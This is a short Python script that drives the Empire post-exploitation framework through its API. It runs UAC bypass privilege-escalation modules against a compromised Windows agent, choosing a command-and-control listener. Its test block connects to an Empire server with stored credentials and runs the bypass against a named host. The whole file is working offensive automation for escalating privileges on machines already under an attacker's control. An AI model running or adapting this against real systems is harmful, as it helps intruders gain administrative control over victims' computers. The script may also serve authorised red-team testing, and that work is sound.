"""
Run various UAC bypass methods available in Empire.
"""
from EmpireAPIWrapper import empireAPI
from empire_settings import *
import autocomplete.empire 

def run(API, agent_name, module_name, listener=None):
    """
        Run given bypassUAC module
        \n:param API: EmpireAPIWrapper object
        \n:param agent_name: name of existing agent
        \n:param module_name: name of bypassUAC method (use autocomplete.empire)
        \n:param listener: name of listener. Will use 1st listener if not specified
        \n:raise error: if no listeners or specified listener not found
    """
    if listener is None:
        listener = API.listeners_get_first()
    elif API.listeners_exist(listener) is False:
        raise ValueError('no such listener')
    opts = autocomplete.empire.privesc.bypassuac.options
    options = {
                opts.required_agent : agent_name,
                opts.required_listener : listener
              }
    API.module_exec(module_name,options)

# for unit testing of each technique
if __name__ == '__main__':
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    agent_name = API.agent_get_name('WIN-7JKBJEGBO38')
    run(API, agent_name, autocomplete.empire.privesc.bypassuac.path)
 